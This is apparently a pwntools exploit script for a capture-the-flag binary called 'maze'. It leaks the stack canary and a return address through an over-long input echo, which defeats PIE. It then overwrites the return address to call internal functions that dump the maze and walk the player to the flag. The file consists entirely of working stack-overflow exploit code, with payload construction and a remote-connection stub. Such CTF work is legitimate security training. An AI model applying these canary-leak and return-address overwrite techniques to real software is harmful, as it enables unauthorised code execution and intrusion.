#!/usr/bin/env python3

from pwn import *

exe = ELF("./maze")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        if args.GDB:
            r = gdb.debug([exe.path, "test_flag"])
        else:
            r = process([exe.path, "test_flag"])
    else:
        r = remote("addr", 1337)

    return r

def to_int(b):
    return int.from_bytes(b, byteorder='little', signed=False)

ret_addr_nopie = 0x00103431
see_maze_addr_nopie = 0x00102a44
move_loop_addr_nopie = 0x00102f7a

ret_gadget_nopie = 0x00103459

LEFT = b"a"
DOWN = b"s"
UP = b"w"
RIGHT = b"d"

def move(r, canary, gadget, callback, direction):
    padding = b"c" * 4
    padding2 = b"d" * 8
    payload = direction + padding + p64(canary) + padding2 + p64(gadget) + p64(callback)
    r.sendline(payload)
    return r.recvuntil(b"(")

def parse_coords(dump):
    #print(dump)
    coords = dump[dump.index(b"(")+1:dump.index(b")")].split(b", ")
    coord_x = int(coords[0])
    coord_y = int(coords[1])
    return (coord_x, coord_y)

def diag_print(val):
    if val != b"\n(":
        print(val)

def main():
    r = conn()

    # leak canary
    padding = b"x" * 6
    r.sendline(padding)
    canary_bytes = bytearray()
    canary_bytes += b"\x00"
    r.recvuntil(b"Invalid input " + padding)
    canary_bytes += r.readn(7)
    canary = to_int(canary_bytes)
    print(f"got canary: {hex(canary)}")

    # leak return address, set binary base
    padding += b"y" * 15
    r.sendline(padding)
    r.recvuntil(b"Invalid input " + padding)
    ret_bytes = bytearray(r.recvuntil(b"\n")[:-1])
    ret_addr = to_int(ret_bytes)
    print(f"got ret addr: {hex(ret_addr)}")
    offset = ret_addr - ret_addr_nopie

    # overwrite return address to print maze
    padding = b"a" * 5
    padding2 = b"b" * 8
    see_maze_addr = see_maze_addr_nopie + offset
    move_loop_addr = move_loop_addr_nopie + offset
    r.sendline(padding + p64(canary) + padding2 + p64(see_maze_addr) + p64(move_loop_addr))

    # die on purpose, parse the maze dump, find the flag
    buf = b""
    while not b"\n." in buf:
        r.sendline(RIGHT)
        buf = r.recv()
    buf += r.recvuntil(b"(")
    buf = buf[buf.index(b"\n"):-1].replace(b"\n", b"")
    assert(len(buf) == 400 * 400)
    flag_idx = buf.index(b"*")
    flag_x = flag_idx % 400
    flag_y = flag_idx // 400
    print(f"flag at ({flag_x}, {flag_y})")

    # move to flag
    (coord_x, coord_y) = parse_coords(b"(" + r.recvuntil(b")"))
    print(f"currently at ({coord_x}, {coord_y})")
    ret_gadget = ret_gadget_nopie + offset

    while flag_x > coord_x:
        res = move(r, canary, ret_gadget, move_loop_addr, RIGHT)
        diag_print(res)
        (coord_x, coord_y) = parse_coords(b"(" + r.recvuntil(b")"))
    r.clean()
    while flag_x < coord_x:
        res = move(r, canary, ret_gadget, move_loop_addr, LEFT)
        diag_print(res)
        (coord_x, coord_y) = parse_coords(b"(" + r.recvuntil(b")"))
    r.clean()

    while flag_y > coord_y:
        res = move(r, canary, ret_gadget, move_loop_addr, DOWN)
        diag_print(res)
        (coord_x, coord_y) = parse_coords(b"(" + r.recvuntil(b")"))
    r.clean()
    while flag_y < coord_y:
        res = move(r, canary, ret_gadget, move_loop_addr, UP)
        diag_print(res)
        (coord_x, coord_y) = parse_coords(b"(" + r.recvuntil(b")"))
    r.clean()

    # i have no idea why but this only puts us near the flag.
    # you have to nudge yourself to the correct spot still.
    r.interactive()


if __name__ == "__main__":
    main()
